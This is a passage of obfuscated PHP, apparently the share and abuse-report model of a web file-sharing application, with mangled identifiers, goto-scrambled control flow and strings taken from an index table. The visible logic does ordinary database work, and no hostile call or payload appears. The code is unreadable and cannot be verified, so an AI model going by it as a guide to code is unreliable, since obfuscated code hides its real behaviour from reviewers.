Session::get($EªÖĞ“ó ¨[2178]); $d¡­Ü’ÊŞ­ = array_to_keyvalue($f¹öëİÊ», $EªÖĞ“ó ¨[33], $EªÖĞ“ó ¨[2066]); goto F±çõØäÅ; F±çõØäÅ: $d­êîŒ×Áô = array($EªÖĞ“ó ¨[525] => SourceModel::TYPE_USER, $EªÖĞ“ó ¨[460] => USER_ID); if ($d¡­Ü’ÊŞ­) { $d­êîŒ×Áô = array(array($EªÖĞ“ó ¨[525] => SourceModel::TYPE_USER, $EªÖĞ“ó ¨[460] => USER_ID), array($EªÖĞ“ó ¨[525] => SourceModel::TYPE_GROUP, $EªÖĞ“ó ¨[460] => array($EªÖĞ“ó ¨[7], $d¡­Ü’ÊŞ­)), $EªÖĞ“ó ¨[2177] => $EªÖĞ“ó ¨[2146]); } $EÚ–ö–ÃÕÆ = Model($EªÖĞ“ó ¨[541])->where($d­êîŒ×Áô)->selectPage($a•“²­ÊÍ); goto A†Š­’ƒó¸; A†Š­’ƒó¸: $d†æÒ« Ğá = array_to_keyvalue_group($EÚ–ö–ÃÕÆ[$EªÖĞ“ó ¨[359]], $EªÖĞ“ó ¨[445]); if (!$d†æÒ« Ğá) { return $EÚ–ö–ÃÕÆ; } $Eçå¿œ¡î = $EªÖĞ“ó ¨[2179]; goto Aå”¼Ğ¢Û¼; Aå”¼Ğ¢Û¼: $d­êîŒ×Áô = array($EªÖĞ“ó ¨[445] => array($EªÖĞ“ó ¨[389], array_keys($d†æÒ« Ğá))); $d›¹ŠÂÑ–‡ = $this->field($Eçå¿œ¡î)->where($d­êîŒ×Áô)->select(); foreach ($d›¹ŠÂÑ–‡ as $DÂÊğğÚ¬½ => &$EíŸöÛª¦) { $EíŸöÛª¦[$EªÖĞ“ó ¨[2176]] = $d†æÒ« Ğá[$EíŸöÛª¦[$EªÖĞ“ó ¨[445]]]; } goto E¹÷µÎ‚± ; a×‚Û´’³­: } protected function shareAdd($Aõ ¥©ò’, $d”ñº³ê¢) { $CÀµ…ù‰ö‡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fô¼ƒ²Üğ = $this->_addShareData($Aõ ¥©ò’, $d”ñº³ê¢); if (!empty($d”ñº³ê¢[$CÀµ…ù‰ö‡[2182]])) { $this->_shareAuthSet($fô¼ƒ²Üğ, $d”ñº³ê¢[$CÀµ…ù‰ö‡[2182]]); } $this->shareEventAdd($Aõ ¥©ò’, $d”ñº³ê¢, $CÀµ…ù‰ö‡[1000]); return $fô¼ƒ²Üğ; } private function shareEventAdd($bôåÒ×´°Œ, $cœ±ÎÏÃ‡à, $BæòÇÒÒïª = "\141\144\144") { goto EÕªæî˜é–; b¯Û‘äŒ·: if ($bç’¥™åÙ[$bá‘ƒ¸Ê‡í[452]] == $bá‘ƒ¸Ê‡í[472] && $cœ±ÎÏÃ‡à[$bá‘ƒ¸Ê‡í[452]] == $bá‘ƒ¸Ê‡í[83]) { $f­“¶¡¯¨ˆ = $bá‘ƒ¸Ê‡í[2184]; } if ($bç’¥™åÙ[$bá‘ƒ¸Ê‡í[452]] == $bá‘ƒ¸Ê‡í[83] && $cœ±ÎÏÃ‡à[$bá‘ƒ¸Ê‡í[452]] == $bá‘ƒ¸Ê‡í[472]) { $f­“¶¡¯¨ˆ = $bá‘ƒ¸Ê‡í[2187]; } Model($bá‘ƒ¸Ê‡í[509])->eventShare($bôåÒ×´°Œ, $f­“¶¡¯¨ˆ); goto d³ºòãç×„; EÕªæî˜é–: $bá‘ƒ¸Ê‡í =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($BæòÇÒÒïª == $bá‘ƒ¸Ê‡í[1000]) { if ($cœ±ÎÏÃ‡à[$bá‘ƒ¸Ê‡í[450]] == $bá‘ƒ¸Ê‡í[83]) { Model($bá‘ƒ¸Ê‡í[509])->eventShare($bôåÒ×´°Œ, $bá‘ƒ¸Ê‡í[2183]); } if ($cœ±ÎÏÃ‡à[$bá‘ƒ¸Ê‡í[452]] == $bá‘ƒ¸Ê‡í[83]) { Model($bá‘ƒ¸Ê‡í[509])->eventShare($bôåÒ×´°Œ, $bá‘ƒ¸Ê‡í[2184]); } return; } $bç’¥™åÙ = $this->getInfoByPath($bôåÒ×´°Œ); goto eäÍÜ¶¥‚; d³ºòãç×„: return; goto Föê’ÃÌ«ò; eäÍÜ¶¥‚: $f­“¶¡¯¨ˆ = $bá‘ƒ¸Ê‡í[2185]; if ($bç’¥™åÙ[$bá‘ƒ¸Ê‡í[450]] == $bá‘ƒ¸Ê‡í[472] && $cœ±ÎÏÃ‡à[$bá‘ƒ¸Ê‡í[450]] == $bá‘ƒ¸Ê‡í[83]) { $f­“¶¡¯¨ˆ = $bá‘ƒ¸Ê‡í[2183]; } if ($bç’¥™åÙ[$bá‘ƒ¸Ê‡í[450]] == $bá‘ƒ¸Ê‡í[83] && $cœ±ÎÏÃ‡à[$bá‘ƒ¸Ê‡í[450]] == $bá‘ƒ¸Ê‡í[472]) { $f­“¶¡¯¨ˆ = $bá‘ƒ¸Ê‡í[2186]; } goto b¯Û‘äŒ·; Föê’ÃÌ«ò: } private function _addShareData($EÙ„ù£îƒº, $b¨ƒ½·Áç = array()) { goto FÃìˆËÚç; fÂêåÖ‡Úß: if ($a¾ËË¯òƒ = $this->where($eí»±Š‚×è)->find()) { return $a¾ËË¯òƒ[$aÀŸİºù¨â[445]]; } if ($EÙ„ù£îƒº == 0) { $c¦ĞÅõ±  = array($aÀŸİºù¨â[28] => get_path_this($b¨ƒ½·Áç[$aÀŸİºù¨â[75]])); } else { $c¦ĞÅõ±  = Model($aÀŸİºù¨â[751])->sourceInfo($EÙ„ù£îƒº); if (!$c¦ĞÅõ± ) { return !1; } } if (!$b¨ƒ½·Áç[$aÀŸİºù¨â[1309]]) { $b¨ƒ½·Áç[$aÀŸİºù¨â[1309]] = $c¦ĞÅõ± [$aÀŸİºù¨â[28]]; } goto fïŒøîõ¹; FÃìˆËÚç: $aÀŸİºù¨â =& $_SERVER[ºÖÙÂŒäÉê‡]; $eí»±Š‚×è = array($aÀŸİºù¨â[388] => $EÙ„ù£îƒº, $aÀŸİºù¨â[1394] => USER_ID); if ($EÙ„ù£îƒº == 0) { $eí»±Š‚×è = array($aÀŸİºù¨â[2188] => $b¨ƒ½·Áç[$aÀŸİºù¨â[1008]], $aÀŸİºù¨â[1394] => USER_ID); } goto fÂêåÖ‡Úß; fïŒøîõ¹: $C±ÔØŞŒÔÃ = array($aÀŸİºù¨â[1394] => USER_ID, $aÀŸİºù¨â[388] => $EÙ„ù£îƒº, $aÀŸİºù¨â[1309] => $aÀŸİºù¨â[33], $aÀŸİºù¨â[450] => 0, $aÀŸİºù¨â[452] => 0, $aÀŸİºù¨â[1008] => $aÀŸİºù¨â[33], $aÀŸİºù¨â[300] => $aÀŸİºù¨â[33], $aÀŸİºù¨â[794] => $aÀŸİºù¨â[33], $aÀŸİºù¨â[2189] => 0, $aÀŸİºù¨â[2190] => 0, $aÀŸİºù¨â[700] => 0, $aÀŸİºù¨â[2191] => $aÀŸİºù¨â[33], $aÀŸİºù¨â[447] => $aÀŸİºù¨â[33]); $c½œ÷ëš = explode($aÀŸİºù¨â[47], $aÀŸİºù¨â[2192]); foreach ($c½œ÷ëš as $cÖ½¿ç¨ä£) { if (!isset($b¨ƒ½·Áç[$cÖ½¿ç¨ä£])) { continue; } $C±ÔØŞŒÔÃ[$cÖ½¿ç¨ä£] = $b¨ƒ½·Áç[$cÖ½¿ç¨ä£]; } goto bæï˜ùÎ˜; f„†’ëµ¿ç: return $D·ì¡ŒøÚ; goto a·Ğˆ¡ Œà; bæï˜ùÎ˜: $D·ì¡ŒøÚ = $this->add($C±ÔØŞŒÔÃ); $Eô½£­ò÷œ = array($aÀŸİºù¨â[447] => short_id($D·ì¡ŒøÚ)); $this->where(array($aÀŸİºù¨â[444] => $D·ì¡ŒøÚ))->save($Eô½£­ò÷œ); goto f„†’ëµ¿ç; a·Ğˆ¡ Œà: } private function _shareAuthSet($a«µĞ¸«ô, $e„œ­©Öò¦) { goto F×ÍÑ¢Û†; B›ƒšäŒ±: $dØ«¼ÙšÔ†->where(array($f±Ä¦‰¬’Î[445] => $a«µĞ¸«ô))->delete(); $c¸”ç‚³ŞŒ = array(); foreach ($e„œ­©Öò¦ as $Aµ“‘¨Î„À) { $fò™ ’ŞİÊ = SourceModel::TYPE_USER; if ($Aµ“‘¨Î„À[$f±Ä¦‰¬’Î[376]] == SourceModel::TYPE_GROUP) { $fò™ ’ŞİÊ = SourceModel::TYPE_GROUP; } $dİ‡Í¹Ô = array($f±Ä¦‰¬’Î[445] => $a«µĞ¸«ô, $f±Ä¦‰¬’Î[376] => $fò™ ’ŞİÊ, $f±Ä¦‰¬’Î[460] => intval($Aµ“‘¨Î„À[$f±Ä¦‰¬’Î[460]]), $f±Ä¦‰¬’Î[2194] => 0, $f±Ä¦‰¬’Î[2195] => -1); if ($Aµ“‘¨Î„À[$f±Ä¦‰¬’Î[2194]]) { $dİ‡Í¹Ô[$f±Ä¦‰¬’Î[2194]] = $Aµ“‘¨Î„À[$f±Ä¦‰¬’Î[2194]]; } else { if ($Aµ“‘¨Î„À[$f±Ä¦‰¬’Î[2195]]) { $dİ‡Í¹Ô[$f±Ä¦‰¬’Î[2195]] = $Aµ“‘¨Î„À[$f±Ä¦‰¬’Î[2195]]; } } $c¸”ç‚³ŞŒ[] = $dİ‡Í¹Ô; } goto dèê·ÃÎ”; F×ÍÑ¢Û†: $f±Ä¦‰¬’Î =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!is_array($e„œ­©Öò¦)) { return !1; } $dØ«¼ÙšÔ† = Model($f±Ä¦‰¬’Î[2193]); goto B›ƒšäŒ±; dèê·ÃÎ”: return $dØ«¼ÙšÔ†->addAll($c¸”ç‚³ŞŒ, array(), !0); goto f½¢¸Æ¿ëÚ; f½¢¸Æ¿ëÚ: } public function numViewAdd($fóôã©ƒß) { $D¼¹ù„†À´ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C½Á×“½‰‡ = array($D¼¹ù„†À´[444] => $fóôã©ƒß); $this->where($C½Á×“½‰‡)->setAdd($D¼¹ù„†À´[2189]); } public function numDownloadAdd($aæï‘‰Äá¯) { $b‹”à££ë =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÄ¥øƒ¤µØ = array($b‹”à££ë[444] => $aæï‘‰Äá¯); $this->where($DÄ¥øƒ¤µØ)->setAdd($b‹”à££ë[2190]); } protected function shareEdit($EºÒöíïã, $AÈñ†ğ˜™ó) { goto c“òèî´½ì; c“òèî´½ì: $FöÙ†ÃÌ‹Í =& $_SERVER[ºÖÙÂŒäÉê‡]; $c´áŠáè±Ò = $this->getInfo($EºÒöíïã); if (!$c´áŠáè±Ò) { return !1; } goto B©Ö´¦¡×ö; bÕ’“åÓéõ: foreach ($FÊ…¤ï‡Â as $c‘©‚ò®ê¨) { if (!array_key_exists($c‘©‚ò®ê¨, $AÈñ†ğ˜™ó)) { continue; } $F¹‚æÑ¥á[$c‘©‚ò®ê¨] = $AÈñ†ğ˜™ó[$c‘©‚ò®ê¨]; } $this->shareEventAdd($c´áŠáè±Ò[$FöÙ†ÃÌ‹Í[374]], $AÈñ†ğ˜™ó, $FöÙ†ÃÌ‹Í[2034]); $this->where(array($FöÙ†ÃÌ‹Í[444] => $EºÒöíïã))->save($F¹‚æÑ¥á); goto e©Â”ëÉ; B©Ö´¦¡×ö: $this->_checkLinkShare($AÈñ†ğ˜™ó, $c´áŠáè±Ò); $F¹‚æÑ¥á = array(); $FÊ…¤ï‡Â = explode($FöÙ†ÃÌ‹Í[47], $FöÙ†ÃÌ‹Í[2196]); goto bÕ’“åÓéõ; e©Â”ëÉ: if (isset($AÈñ†ğ˜™ó[$FöÙ†ÃÌ‹Í[2182]])) { $this->_shareAuthSet($EºÒöíïã, $AÈñ†ğ˜™ó[$FöÙ†ÃÌ‹Í[2182]]); } return !0; goto aÌø†ˆ–êƒ; aÌø†ˆ–êƒ: } private function _checkLinkShare($bêÊ´ßµ×¨, $Bé×Ö•â¯¡) { goto e´ø¯„éØ; A‹ëĞ×ßÔë: $a¶ÓŞ¼Æ = $this->shareFileMeta($BÁè§¹ğ‰[$C½„É™ÇÎ[423]]); if (isset($a¶ÓŞ¼Æ[$C½„É™ÇÎ[364]]) && $a¶ÓŞ¼Æ[$C½„É™ÇÎ[364]] == $C½„É™ÇÎ[83]) { show_json(LNG($C½„É™ÇÎ[2199]), !1); } goto aö‚…³ÉÁ³; e´ø¯„éØ: $C½„É™ÇÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($bêÊ´ßµ×¨[$C½„É™ÇÎ[450]] != $C½„É™ÇÎ[83]) { return; } $e¬××‹‘¶­ = $Bé×Ö•â¯¡[$C½„É™ÇÎ[396]][$C½„É™ÇÎ[374]]; goto D¶ŸÃ¨‘æ; D¶ŸÃ¨‘æ: if ($Bé×Ö•â¯¡[$C½„É™ÇÎ[396]][$C½„É™ÇÎ[29]] != $C½„É™ÇÎ[163]) { $dÉŒÈ­Óæ½ = $this->_folderReport($e¬××‹‘¶­); if (!$dÉŒÈ­Óæ½) { return; } show_json(LNG($C½„É™ÇÎ[2197]) . $C½„É™ÇÎ[2198] . $dÉŒÈ­Óæ½, !1); } $BÁè§¹ğ‰ = Model($C½„É™ÇÎ[751])->fileInfoGet($Bé×Ö•â¯¡[$C½„É™ÇÎ[396]][$C½„É™ÇÎ[374]]); if (!$BÁè§¹ğ‰) { return; } goto A‹ëĞ×ßÔë; aö‚…³ÉÁ³: } private function _folderReport($e…Â¾¬…«¨) { goto B–˜Ì¹¤ŞÊ; dê¢Í§‡„: $e·ñß¤ = array_to_keyvalue($f™‡î¬±™, $d¼Ó”ÁÊ¶Ÿ[33], $d¼Ó”ÁÊ¶Ÿ[28]); $e·ñß¤[] = $D¼Æ†ğ¡‘[$d¼Ó”ÁÊ¶Ÿ[28]]; return implode($d¼Ó”ÁÊ¶Ÿ[8], $e·ñß¤); goto a¼º¬’ƒŸ¤; EÊï„”±ŒÜ: $bß“‰ášÄ = substr($D¼Æ†ğ¡‘[$d¼Ó”ÁÊ¶Ÿ[463]], strpos($D¼Æ†ğ¡‘[$d¼Ó”ÁÊ¶Ÿ[463]], $fÍ¦‰İØ³•)); $e…ƒƒİ…šË = array($d¼Ó”ÁÊ¶Ÿ[374] => array($d¼Ó”ÁÊ¶Ÿ[7], trim($bß“‰ášÄ, $d¼Ó”ÁÊ¶Ÿ[47]))); $f™‡î¬±™ = Model($d¼Ó”ÁÊ¶Ÿ[751])->where($e…ƒƒİ…šË)->field($d¼Ó”ÁÊ¶Ÿ[28])->select(); goto dê¢Í§‡„; B†Ò…£ÆËÚ: $e…ƒƒİ…šË = array($d¼Ó”ÁÊ¶Ÿ[423] => array($d¼Ó”ÁÊ¶Ÿ[7], $C½ëñ£á™), $d¼Ó”ÁÊ¶Ÿ[463] => array($d¼Ó”ÁÊ¶Ÿ[750], "\x25{$fÍ¦‰İØ³•}\x25"), $d¼Ó”ÁÊ¶Ÿ[401] => 0); $D¼Æ†ğ¡‘ = Model($d¼Ó”ÁÊ¶Ÿ[751])->where($e…ƒƒİ…šË)->field($d¼Ó”ÁÊ¶Ÿ[2201])->find(); if (!$D¼Æ†ğ¡‘) { return !1; } goto EÊï„”±ŒÜ; B–˜Ì¹¤ŞÊ: $d¼Ó”ÁÊ¶Ÿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e…ƒƒİ…šË = array($d¼Ó”ÁÊ¶Ÿ[423] => array($d¼Ó”ÁÊ¶Ÿ[918], 0), $d¼Ó”ÁÊ¶Ÿ[686] => 3); $C½ëñ£á™ = Model($d¼Ó”ÁÊ¶Ÿ[2200])->where($e…ƒƒİ…šË)->field($d¼Ó”ÁÊ¶Ÿ[423])->select(); goto eÄ ˆÅÕåÇ; eÄ ˆÅÕåÇ: if (!$C½ëñ£á™) { return !1; } $C½ëñ£á™ = array_to_keyvalue($C½ëñ£á™, $d¼Ó”ÁÊ¶Ÿ[33], $d¼Ó”ÁÊ¶Ÿ[423]); $fÍ¦‰İØ³• = $d¼Ó”ÁÊ¶Ÿ[47] . $e…Â¾¬…«¨ . $d¼Ó”ÁÊ¶Ÿ[47]; goto B†Ò…£ÆËÚ; a¼º¬’ƒŸ¤: } protected function remove($a…³Ö‡¢ºÄ) { goto C…ØÒööÚç; cŠ·Ü¼í¦¹: for ($b£„”ì¨»— = 0; $b£„”ì¨»— < count($aË¯Ë÷†Ä); $b£„”ì¨»—++) { $B¹¦Éµ¬ê = $this->getInfo($aË¯Ë÷†Ä[$b£„”ì¨»—]); if ($B¹¦Éµ¬ê[$FœÁìñç‡ì[452]] == $FœÁìñç‡ì[83]) { Model($FœÁìñç‡ì[509])->eventShare($B¹¦Éµ¬ê[$FœÁìñç‡ì[374]], $FœÁìñç‡ì[2187]); } if ($B¹¦Éµ¬ê[$FœÁìñç‡ì[450]] == $FœÁìñç‡ì[83]) { Model($FœÁìñç‡ì[509])->eventShare($B¹¦Éµ¬ê[$FœÁìñç‡ì[374]], $FœÁìñç‡ì[2186]); } } return $Cæ¼ºÁ‚ğ¿; goto fÄÒÜÆ‰Éö; C…ØÒööÚç: $FœÁìñç‡ì =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_array($a…³Ö‡¢ºÄ)) { $a…³Ö‡¢ºÄ = array($FœÁìñç‡ì[7], $a…³Ö‡¢ºÄ); } $DÌ‡‚ÅÊ®Û = array($FœÁìñç‡ì[445] => $a…³Ö‡¢ºÄ); goto EŒÀè¼ùŞ×; EŒÀè¼ùŞ×: $Cæ¼ºÁ‚ğ¿ = $this->where($DÌ‡‚ÅÊ®Û)->delete(); if ($Cæ¼ºÁ‚ğ¿) { Model($FœÁìñç‡ì[541])->where(array($FœÁìñç‡ì[445] => $a…³Ö‡¢ºÄ))->delete(); } $aË¯Ë÷†Ä = is_array($a…³Ö‡¢ºÄ) ? $a…³Ö‡¢ºÄ[1] : array($a…³Ö‡¢ºÄ); goto cŠ·Ü¼í¦¹; fÄÒÜÆ‰Éö: } protected function removeBySource($CöôËø³ãò) { goto CºÜÜ×²¤™; cËØ£í·é³: $this->where($F¸Ø ï©¥ù)->delete(); Model($c²—ñ‘å‡¤[541])->where($F¸Ø ï©¥ù)->delete(); goto d™ÑÕˆˆíù; CºÜÜ×²¤™: $c²—ñ‘å‡¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¸Ø ï©¥ù = array($c²—ñ‘å‡¤[388] => array($c²—ñ‘å‡¤[389], $CöôËø³ãò)); $CŞìË‡“Ôè = $this->field($c²—ñ‘å‡¤[445])->where($F¸Ø ï©¥ù)->select(); goto c‰ä”¡Ã‚; c‰ä”¡Ã‚: $CŞìË‡“Ôè = array_to_keyvalue($CŞìË‡“Ôè, $c²—ñ‘å‡¤[33], $c²—ñ‘å‡¤[445]); if (!$CŞìË‡“Ôè) { return; } $F¸Ø ï©¥ù = array($c²—ñ‘å‡¤[444] => array($c²—ñ‘å‡¤[389], $CŞìË‡“Ôè)); goto cËØ£í·é³; d™ÑÕˆˆíù: } public function listAll($d¾ÕŞ³ãÛ¶) { goto d¸­‚Ù®ñº; d¸­‚Ù®ñº: $bƒ‡ÛÎ³³ =& $_SERVER[ºÖÙÂŒäÉê‡]; $CŒš®„‡Î = array(); if ($d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[1403]]) { $CŒš®„‡Î[$bƒ‡ÛÎ³³[1403]] = $d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[1403]]; } goto CÂÆ¬ÕÑÖİ; aØ´×›²î: return $FŸ‚Œ¬ã——; goto F¹µá÷‚ŒÑ; CÂÆ¬ÕÑÖİ: if ($d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[699]]) { $d—Á ½¸„¾ = $d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[700]] ? $d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[700]] : strtotime(date($bƒ‡ÛÎ³³[2202])); $CŒš®„‡Î[$bƒ‡ÛÎ³³[193]] = array($bƒ‡ÛÎ³³[326], array($d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[699]], $d—Á ½¸„¾)); } if ($d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[29]]) { $CŒš®„‡Î[$d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[29]]] = 1; } else { $CŒš®„‡Î[] = array($bƒ‡ÛÎ³³[450] => array($bƒ‡ÛÎ³³[918], 0), $bƒ‡ÛÎ³³[452] => array($bƒ‡ÛÎ³³[918], 0), $bƒ‡ÛÎ³³[2177] => $bƒ‡ÛÎ³³[2146]); } if ($d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[2142]]) { $CŒš®„‡Î[] = array($bƒ‡ÛÎ³³[447] => $d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[2142]], $bƒ‡ÛÎ³³[1309] => array($bƒ‡ÛÎ³³[750], "\45{$d¾ÕŞ³ãÛ¶[$bƒ‡ÛÎ³³[2142]]}\45"), $bƒ‡ÛÎ³³[2177] => $bƒ‡ÛÎ³³[2146]); } goto Câ“¥ùîºĞ; Câ“¥ùîºĞ: $FŸ‚Œ¬ã—— = $this->_makeOrder()->where($CŒš®„‡Î)->selectPage(20); if (empty($FŸ‚Œ¬ã——[$bƒ‡ÛÎ³³[359]])) { return array(); } $this->_listDataApply($FŸ‚Œ¬ã——[$bƒ‡ÛÎ³³[359]]); goto aØ´×›²î; F¹µá÷‚ŒÑ: } public function listDataApply($bä†Òé‚ ) { $this->_listDataApply($bä†Òé‚ ); return $bä†Òé‚ ; } private function _listDataApply(&$EÒ‘è†Áİ–) { $eé‹°À„óé =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‚ÒÉæ¿ß‰ = array_to_keyvalue($EÒ‘è†Áİ–, $eé‹°À„óé[33], $eé‹°À„óé[1403]); $fØªÇå‹¨ = Model($eé‹°À„óé[481])->userListInfo(array_unique($E‚ÒÉæ¿ß‰)); $C»Ôçà±æÏ = array_to_keyvalue($EÒ‘è†Áİ–, $eé‹°À„óé[33], $eé‹°À„óé[374]); $e’êÒäŒ¬Ë = Model($eé‹°À„óé[751])->sourceListInfo($C»Ôçà±æÏ, !0); foreach ($EÒ‘è†Áİ– as &$Cçªõ†§˜) { $B‘Î‹ôÂÃä = $Cçªõ†§˜[$eé‹°À„óé[1403]]; $Cçªõ†§˜[$eé‹°À„óé[2203]] = $fØªÇå‹¨[$B‘Î‹ôÂÃä] ? $fØªÇå‹¨[$B‘Î‹ôÂÃä] : !1; $CÓàšÜ†ÉŸ = $Cçªõ†§˜[$eé‹°À„óé[374]]; $Cçªõ†§˜[$eé‹°À„óé[396]] = $e’êÒäŒ¬Ë[$CÓàšÜ†ÉŸ] ? $e’êÒäŒ¬Ë[$CÓàšÜ†ÉŸ] : !1; } } private function _makeOrder($cìÒ´ê¨¹˜ = '') { goto Cğ·°ôƒÓË; Cğ·°ôƒÓË: $e´»ŸßéÆß =& $_SERVER[ºÖÙÂŒäÉê‡]; $D†šÆğß¾ë = array($e´»ŸßéÆß[193], $e´»ŸßéÆß[700], $e´»ŸßéÆß[2189], $e´»ŸßéÆß[2190]); $EÕÊ„ËÑòê = array($e´»ŸßéÆß[406] => $e´»ŸßéÆß[407], $e´»ŸßéÆß[408] => $e´»ŸßéÆß[409]); goto eÁŸ½†…¦¸; A„Ì›Ú’‰Ú: $cìÒ´ê¨¹˜ = $cìÒ´ê¨¹˜ . "{$EºøÜâñ}\40{$E™Ï‘„ ‹‡}"; return $this->order($cìÒ´ê¨¹˜); goto A™å““™·­; eÁŸ½†…¦¸: $EºøÜâñ = Input::get($e´»ŸßéÆß[411], $e´»ŸßéÆß[7], $e´»ŸßéÆß[394], $D†šÆğß¾ë); $E™Ï‘„ ‹‡ = Input::get($e´»ŸßéÆß[412], $e´»ŸßéÆß[7], $e´»ŸßéÆß[2204], array($e´»ŸßéÆß[2141], $e´»ŸßéÆß[408])); $E™Ï‘„ ‹‡ = $EÕÊ„ËÑòê[$E™Ï‘„ ‹‡]; goto A„Ì›Ú’‰Ú; A™å““™·­: } public function reportAdd($e—ã˜ÏÓ«ù) { $Dè±¸õòä =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÔÖÄÂÊÎÓ = array($Dè±¸õòä[445] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[445]], $Dè±¸õòä[1403] => USER_ID); if (Model($Dè±¸õòä[2200])->where($bÔÖÄÂÊÎÓ)->find()) { return !1; } $a±ˆšó³õÀ = array($Dè±¸õòä[445] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[445]], $Dè±¸õòä[1309] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[1309]], $Dè±¸õòä[374] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[374]], $Dè±¸õòä[423] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[423]], $Dè±¸õòä[1403] => USER_ID, $Dè±¸õòä[29] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[29]], $Dè±¸õòä[409] => $e—ã˜ÏÓ«ù[$Dè±¸õòä[409]]); return Model($Dè±¸õòä[2200])->add($a±ˆšó³õÀ); } public function reportList($DÃ’ˆ‘…©º) { goto bí²ÜâèÍ; eãÇèçÈ·º: $a®«ÖÀ•Ò‰ = array($Fº‚±·µó[406] => $Fº‚±·µó[407], $Fº‚±·µó[408] => $Fº‚±·µó[409]); $còøÛ„»¡ = $Fº‚±·µó[2208] . $a®«ÖÀ•Ò‰[$fÙ†·ÙØ]; $f¡–‹½£æ• = Model($Fº‚±·µó[2200])->where($f¥°Æà†Ì¡)->order($còøÛ„»¡)->selectPage(20); goto CÙ ÖŞùë¯; bí²ÜâèÍ: $Fº‚±·µó =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¥°Æà†Ì¡ = array(); if ($DÃ’ˆ‘…©º[$Fº‚±·µó[699]]) { $BÆƒíŠËë = $DÃ’ˆ‘…©º[$Fº‚±·µó[700]] ? $DÃ’ˆ‘…©º[$Fº‚±·µó[700]] : strtotime(date($Fº‚±·µó[2202])); $f¥°Æà†Ì¡[$Fº‚±·µó[193]] = array($Fº‚±·µó[326], array($DÃ’ˆ‘…©º[$Fº‚±·µó[699]], $BÆƒíŠËë)); } goto bÇ˜°†İ‰ô; CÙ ÖŞùë¯: if (empty($f¡–‹½£æ•[$Fº‚±·µó[359]])) { return array(); } $this->_listDataApply($f¡–‹½£æ•[$Fº‚±·µó[359]]); return $f¡–‹½£æ•; goto f²õ”åÅ„; bÇ˜°†İ‰ô: if (isset($DÃ’ˆ‘…©º[$Fº‚±·µó[29]]) && in_array($DÃ’ˆ‘…©º[$Fº‚±·µó[29]], array($Fº‚±·µó[83], $Fº‚±·µó[2205], $Fº‚±·µó[2206], $Fº‚±·µó[2207], $Fº‚±·µó[1882]))) { $f¥°Æà†Ì¡[$Fº‚±·µó[29]] = $DÃ’ˆ‘…©º[$Fº‚±·µó[29]]; } if (isset($DÃ’ˆ‘…©º[$Fº‚±·µó[686]]) && in_array($DÃ’ˆ‘…©º[$Fº‚±·µó[686]], array($Fº‚±·µó[472], $Fº‚±·µó[83], $Fº‚±·µó[2205], $Fº‚±·µó[2206]))) { $f¥°Æà†Ì¡[$Fº‚±·µó[686]] = $DÃ’ˆ‘…©º[$Fº‚±·µó[686]]; } $fÙ†·ÙØ = Input::get($Fº‚±·µó[412], $Fº‚±·µó[7], $Fº‚±·µó[2204], array($Fº‚±·µó[2141], $Fº‚±·µó[408])); goto eãÇèçÈ·º; f²õ”åÅ„: } public function reportStatus($bëÏ–³˜Åº) { goto b˜İêÕ¢ÅÆ; b˜İêÕ¢ÅÆ: $cÂÎ¼ÍœÕ =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÂ˜ğî£ğ˜ = array($cÂÎ¼ÍœÕ[372] => $bëÏ–³˜Åº[$cÂÎ¼ÍœÕ[372]]); $d¸È•·àÜê = Model($cÂÎ¼ÍœÕ[2200])->where($CÂ˜ğî£ğ˜)->field($cÂÎ¼ÍœÕ[2209])->find(); goto Aõ«ÛË¥ÇÔ; fŒ§…Ğ´´Í: $Fõæ¥ãøë‘ = Model($cÂÎ¼ÍœÕ[2200])->where($CÂ˜ğî£ğ˜)->save($fó†‰±´…å); if ($bëÏ–³˜Åº[$cÂÎ¼ÍœÕ[686]] == $cÂÎ¼ÍœÕ[2205]) { if ($d¸È•·àÜê[$cÂÎ¼ÍœÕ[423]] != $cÂÎ¼ÍœÕ[472] && $this->shareFileMeta($d¸È•·àÜê[$cÂÎ¼ÍœÕ[423]])) { $this->shareFileMeta($d¸È•·àÜê[$cÂÎ¼ÍœÕ[423]], 0); } return $this->remove($d¸È•·àÜê[$cÂÎ¼ÍœÕ[445]]); } if ($Fõæ¥ãøë‘ && $bëÏ–³˜Åº[$cÂÎ¼ÍœÕ[686]] == $cÂÎ¼ÍœÕ[2206]) { $féí£¢¬ = $fó†‰±´…å[$cÂÎ¼ÍœÕ[686]] == $cÂÎ¼ÍœÕ[2206] ? 1 : 0; $this->shareFileMeta($d¸È•·àÜê[$cÂÎ¼ÍœÕ[423]], $féí£¢¬); $this->removeByFile($d¸È•·àÜê[$cÂÎ¼ÍœÕ[423]]); } goto bøì“Ù˜º£; Aõ«ÛË¥ÇÔ: if (!$d¸È•·àÜê) { return !1; } $fó†‰±´…å = array($cÂÎ¼ÍœÕ[686] => $bëÏ–³˜Åº[$cÂÎ¼ÍœÕ[686]]); if ($bëÏ–³˜Åº[$cÂÎ¼ÍœÕ[686]] == $cÂÎ¼ÍœÕ[2206] && 